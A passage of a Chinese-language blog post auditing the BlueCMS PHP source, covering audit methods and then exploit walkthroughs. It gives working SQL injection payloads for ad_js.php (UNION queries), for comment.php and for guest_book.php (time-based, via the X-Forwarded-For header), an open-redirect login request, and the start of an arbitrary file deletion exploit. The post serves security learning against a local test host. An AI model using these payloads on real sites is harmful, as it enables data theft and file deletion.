intval($_REQUEST[<span class="string">'cid'</span>]) : <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>可以看到，这里虽然输入变量，但是经过了<strong>intval</strong>函数的过滤处理，所以我们无法利用，这个文件我们就先pass掉，就这个道理继续往下看</p><p>来到<code>user.php</code>文件，存在可利用的变量$from和$act：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$act = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'act'</span>]) ? trim($_REQUEST[<span class="string">'act'</span>]) : <span class="string">'default'</span>;</span><br><span class="line">$from = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'from'</span>]) ? $_REQUEST[<span class="string">'from'</span>] : <span class="string">''</span>;</span><br></pre></td></tr></table></figure><p>这个文件也很长，我们直接搜索关键字跟踪变量<strong>$from</strong>，发现大多数做为参数传入了<strong>showmsg</strong>函数，例如112行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmsg(<span class="string">'欢迎您 '</span>.$user_name.<span class="string">' 回来，现在将转到...'</span>, $from);</span><br></pre></td></tr></table></figure><p>我们可以大致猜到这个函数是用来进行页面跳转的，具体我们可以跟踪这个函数，这里我在<strong>seay审计系统</strong>中进行内容全局搜索<code>function showmsg</code>，查询结果在<code>/include/common.fun.php</code>文件中对这个函数进行了定义，审计该文件中的这个函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showmsg</span><span class="params">($msg,$gourl=<span class="string">'goback'</span>, $is_write = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">global</span> $smarty;</span><br><span class="line"> $smarty-&gt;caching = <span class="keyword">false</span>;</span><br><span class="line"> $smarty-&gt;assign(<span class="string">"msg"</span>,$msg);</span><br><span class="line"> $smarty-&gt;assign(<span class="string">"gourl"</span>,$gourl);</span><br><span class="line"> $smarty-&gt;display(<span class="string">"showmsg.htm"</span>);</span><br><span class="line"> <span class="keyword">if</span>($is_write)</span><br><span class="line"> &#123;</span><br><span class="line"> write_log($msg, $_SESSION[<span class="string">'admin_name'</span>]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面又利用了两个函数<strong>assign</strong>和<strong>display</strong>，同样继续跟踪这两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = null)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_array($tpl_var))&#123;</span><br><span class="line">          <span class="keyword">foreach</span> ($tpl_var <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">              <span class="keyword">if</span> ($key != <span class="string">''</span>) &#123;</span><br><span class="line">                  <span class="keyword">$this</span>-&gt;_tpl_vars[$key] = $val;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</span><br><span class="line">              <span class="keyword">$this</span>-&gt;_tpl_vars[$tpl_var] = $value;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($resource_name, $cache_id = null, $compile_id = null)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;fetch($resource_name, $cache_id, $compile_id, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>assign函数作用是将第二个参数作为键值，第一个参数作为键名。至于display函数，跟踪fetch函数有点长，这里我没有很详细的去看（其实是看不太懂…），只知道大致功能就是跳转页面。然后整个showmsg功能就是将assign中的数据渲染到display中的html页面。而这里传入参数<strong>$from</strong>，我们就可以猜测，可以通过该参数进行任意页面跳转的作用</p><p>依次类推，通过这个方法，相信只要耐心足够，一定很容易可以挖到一些漏洞</p><h3 id="2-通过工具审计漏洞"><a href="#2-通过工具审计漏洞" class="headerlink" title="2.通过工具审计漏洞"></a>2.通过工具审计漏洞</h3><p>第一种方法只是粗略的审计，一定还会有我们疏忽的漏洞，所以第二种方法，我用了审计工具来帮助我们进行审计，这里使用<strong>Seay审计系统</strong>，个人觉得还是不错的一款工具，还能进行关键字全局搜索。当然工具只是帮你分析可能存在的漏洞，并不是决定，具体我们还得一个个去耐心分析</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到，工具审计非常多可能存在的漏洞，但我还是按照第一种方法的思想，找存在输入的点，这样能更高效的寻找漏洞</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>例如上图，我们发现了变量<code>$ip</code>是通过头部的IP字段获取的，在这个字段我们是不用去关心转义过滤的，是个非常好利用的变量，所以我们赶紧跟踪<code>/include/common.fun.php</code>这个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) </span><br><span class="line">&#123; <span class="comment">//获取客户端用代理服务器访问时的真实ip 地址</span></span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现这个关键函数<strong>getip</strong>，它返回的变量$ip我们是可以利用的，继续搜索这个函数getip，看看哪里可以利用到</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现<code>/comment.php</code>文件中存在通过该函数拼接而成的sql语句，猜测就可能存在sql注入漏洞，跟踪该文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"INSERT INTO "</span>.table(<span class="string">'comment'</span>).<span class="string">" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '"</span>.getip().<span class="string">"', '$is_check')"</span>;</span><br></pre></td></tr></table></figure><p>在113-114行找到了拼接的sql语句，我们可以通过伪造头部<code>X-Forwarded-For</code>字段来进行sql注入</p><p>依次类推，通过工具帮助我们审计，也能挖掘到更多漏洞</p><h3 id="3-搜索危险函数"><a href="#3-搜索危险函数" class="headerlink" title="3.搜索危险函数"></a>3.搜索危险函数</h3><p>第三种方法，我们还可以搜索一些导致漏洞的危险函数，例如<strong>unlink</strong>，<strong>include</strong>，<strong>move_uploaded_file</strong>函数等，这里搜索<strong>unlink</strong>函数为例</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>搜索结果显示出非常多unlink函数中存在我们可以输入进行控制的变量，例如<code>/user.php</code>下的616行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (file_exists(BLUE_ROOT.$_POST[&apos;lit_pic&apos;])) &#123;</span><br><span class="line">@unlink(BLUE_ROOT.$_POST[&apos;lit_pic&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就存在可以利用的变量<code>$_POST[&#39;lit_pic&#39;]</code>，我们跟踪该变量，发现除了开头包含文件的转义处理以外，无其他过滤地方，很明显我们就可以利用该变量进行网站根目录下任意文件删除的操作</p><h3 id="4-借鉴别人的文章"><a href="#4-借鉴别人的文章" class="headerlink" title="4.借鉴别人的文章"></a>4.借鉴别人的文章</h3><p>一开始审计，难免会有很多漏洞自己忽略掉没审计到，这时候我们就需要多去参考别人审计该cms的文章，寻找出自己未审计出的漏洞，并总结自己为什么没有找出该漏洞，这样就为下次审计积累更多的经验</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-UNION注入"><a href="#1-UNION注入" class="headerlink" title="1.UNION注入"></a>1.UNION注入</h3><p><code>/ad_js.php</code>第19行通过变量<code>$ad_id</code>拼接的sql语句由于变量<code>$ad_id</code>未进行过滤并且无引号包裹，存在SQL注入漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--\r\ndocument.write(\""</span>.$ad_content.<span class="string">"\");\r\n--&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure><p>有回馈信息，所以我们直接用<strong>union注入</strong></p><p>首先通过<strong>order by</strong>测试查询字段数为7，然后通过测试得知回显字段在第6位</p><p>注数据库payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ad_id=0%20union%20select%200,0,0,0,0,database(),0</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注表名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ad_js.php?ad_id=0%20union%20select%200,0,0,0,0,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注blue_ad表下的列名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ad_id=0%20union%20select%200,0,0,0,0,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x626c75655f6164),0</span><br></pre></td></tr></table></figure><p>注意将<strong>blue_ad</strong>转化为十六进制</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="2-INSERT-INTO注入"><a href="#2-INSERT-INTO注入" class="headerlink" title="2.INSERT INTO注入"></a>2.INSERT INTO注入</h3><p><code>/include/common.fun.php</code>下<strong>getip()</strong>函数返回存在通过头部IP字段获取的变量，跟踪该函数发现<code>comment.php</code>下第113行可利用getip()获取的可控变量进行sql注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line">VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;;</span><br></pre></td></tr></table></figure><p>这是一个添加评论功能的页面，功能整体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'send'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($id))</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> $user_id = $_SESSION[<span class="string">'user_id'</span>] ? $_SESSION[<span class="string">'user_id'</span>] : <span class="number">0</span>;</span><br><span class="line"> $mood = intval($_POST[<span class="string">'mood'</span>]);</span><br><span class="line"> $content = !<span class="keyword">empty</span>($_POST[<span class="string">'comment'</span>]) ? htmlspecialchars($_POST[<span class="string">'comment'</span>]) : <span class="string">''</span>;</span><br><span class="line"> $content = nl2br($content);</span><br><span class="line"> $type = intval($_POST[<span class="string">'type'</span>]);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>($content))</span><br><span class="line"> &#123;</span><br><span class="line"> showmsg(<span class="string">'评论内容不能为空'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>($_CFG[<span class="string">'comment_is_check'</span>] == <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> $is_check = <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> $is_check = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> $sql = <span class="string">"INSERT INTO "</span>.table(<span class="string">'comment'</span>).<span class="string">" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '"</span>.getip().<span class="string">"', '$is_check')"</span>;</span><br><span class="line"> $db-&gt;query($sql);</span><br><span class="line"> <span class="keyword">if</span>($type == <span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> $db-&gt;query(<span class="string">"UPDATE "</span>.table(<span class="string">'article'</span>).<span class="string">" SET comment = comment+1 WHERE id = "</span>.$id);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span>($type == <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> $db-&gt;query(<span class="string">"UPDATE "</span>.table(<span class="string">'post'</span>).<span class="string">" SET comment = comment+1 WHERE post_id = "</span>.$id);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>($_CFG[<span class="string">'comment_is_check'</span>] == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">showmsg(<span class="string">'请稍候，您的评论正在审核当中...'</span>,<span class="string">'comment.php?id='</span>.$id.<span class="string">'&amp;type='</span>.$type);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">showmsg(<span class="string">'发布评论成功'</span>,<span class="string">'comment.php?id='</span>.$id.<span class="string">'&amp;type='</span>.$type);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要执行SQL语句所需要控制的变量为<code>$_GET[&#39;act&#39;] == &#39;send&#39;,$_POST[&#39;content&#39;] != &#39;&#39;,</code></p><p>然后分析SQL语句，这是一个<strong>INSERT INTO</strong>语句，注入的方式有挺多种，这里我采用的是通过<code>select case when then else</code>语句进行延时注入的方法，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /comment.php?act=send HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; BLUE[user_id]=3; BLUE[user_name]=user02; BLUE[user_pwd]=1e6a32c00852bd4dbf303ab4d54a1380; detail=5</span><br><span class="line">X-Forwarded-For:1&apos;+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),&apos;1&apos;)# </span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line">id=1&amp;mood=1&amp;comment=1&amp;type=1</span><br></pre></td></tr></table></figure><p>拼接后的sql语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blue_comment (com_id, post_id, user_id, <span class="keyword">type</span>, mood, <span class="keyword">content</span>, pub_date, ip, is_check) <span class="keyword">VALUES</span> (<span class="string">''</span>, <span class="string">'1'</span>, <span class="string">'3'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">98</span>) <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">1</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>),<span class="string">'1'</span>)#, <span class="string">'1'</span>)</span><br></pre></td></tr></table></figure><p>之后就是写脚本注入了</p><p>同样的漏洞存在于<code>/include/common.inc.php</code>第四十五行存在通过getip()函数获得的变量<code>$online_ip</code>，跟踪该变量发现<code>/guest_book.php</code>第77-78行同样存在SQL注入漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;$online_ip&apos;, &apos;$content&apos;)&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($act == <span class="string">'send'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$user_id = $_SESSION[<span class="string">'user_id'</span>] ? $_SESSION[<span class="string">'user_id'</span>] : <span class="number">0</span>;</span><br><span class="line">$rid = intval($_POST[<span class="string">'rid'</span>]);</span><br><span class="line"> $content = !<span class="keyword">empty</span>($_POST[<span class="string">'content'</span>]) ? htmlspecialchars($_POST[<span class="string">'content'</span>]) : <span class="string">''</span>;</span><br><span class="line"> $content = nl2br($content);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>($content))</span><br><span class="line"> &#123;</span><br><span class="line"> showmsg(<span class="string">'评论内容不能为空'</span>);</span><br><span class="line"> &#125;</span><br><span class="line">$sql = <span class="string">"INSERT INTO "</span> . table(<span class="string">'guest_book'</span>) . <span class="string">" (id, rid, user_id, add_time, ip, content) </span></span><br><span class="line"><span class="string">VALUES ('', '$rid', '$user_id', '$timestamp', '$online_ip', '$content')"</span>;</span><br><span class="line">$db-&gt;query($sql);</span><br><span class="line">showmsg(<span class="string">'恭喜您留言成功'</span>, <span class="string">'guest_book.php?page_id='</span>.$_POST[<span class="string">'page_id'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /guest_book.php?act=send HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/ann.php?cid=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=5</span><br><span class="line">X-Forwarded-For:1&apos;+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),&apos;1&apos;)# </span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">rid=1&amp;content=1</span><br></pre></td></tr></table></figure><h3 id="3-任意文件跳转漏洞"><a href="#3-任意文件跳转漏洞" class="headerlink" title="3.任意文件跳转漏洞"></a>3.任意文件跳转漏洞</h3><p><code>/user.php</code>文件第112行通过控制变量<code>$from</code>可进行任意文件跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$from = !empty($from) ? base64_decode($from) : &apos;user.php&apos;;</span><br><span class="line">showmsg(&apos;欢迎您 &apos;.$user_name.&apos; 回来，现在将转到...&apos;, $from);</span><br></pre></td></tr></table></figure><p>前面我们已经分析了<strong>showmsg</strong>函数的作用是页面跳转，同时注意这里<code>$from</code>有经过base64解密，我们通过登录用户，抓取登录包，其实就可以发现$from变量，我们假设跳转到根目录下的robots.txt文件，将<code>robots.txt</code>进行base64编码</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 108</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/user.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">referer=&amp;user_name=user02&amp;pwd=user02&amp;safecode=xipt&amp;useful_time=604800&amp;submit=%B5%C7%C2%BC&amp;from=cm9ib3RzLnR4dA==&amp;act=do_login</span><br></pre></td></tr></table></figure><p>登录成功后跳转到robots.txt页面</p><h3 id="4-任意文件删除漏洞"><a href="#4-任意文件删除漏洞" class="headerlink" title="4.任意文件删除漏洞"></a>4.任意文件删除漏洞</h3><p><code>/user.php</code>第616行存在未过滤变量<code>$_POST[&#39;lit_pic&#39;]</code>，导致任意文件删除漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(BLUE_ROOT.$_POST[<span class="string">'lit_pic'</span>])) &#123;</span><br><span class="line">@unlink(BLUE_ROOT.$_POST[<span class="string">'lit_pic'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 